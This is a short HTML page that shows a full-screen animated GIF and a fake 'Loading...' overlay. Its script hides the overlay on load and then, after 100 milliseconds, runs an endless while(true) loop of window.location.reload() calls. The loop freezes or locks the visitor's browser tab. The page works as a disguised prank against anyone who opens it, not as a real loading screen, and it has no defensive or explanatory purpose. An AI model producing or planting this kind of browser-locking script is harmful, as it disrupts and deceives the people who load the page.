<style>
  body{
    background:url("https://media.giphy.com/media/LXONhtCmN32YU/giphy.gif");
    background-position: center;
    background-repeat: no-repeat;
    background-size: cover;
  }
</style>
<div id="loading" style="position:absolute;width:100%;height:100%;left:0px;top:0px;background-color:black;color:white;text-align:center;"><h1><b>Loading...</b></h1></div>
<script>
  window.onload=function(){
    document.getElementById("loading").style.display="none";
    setTimeout(() => {
      while (true){
        window.location.reload();
      }
    },100);
  };
</script>
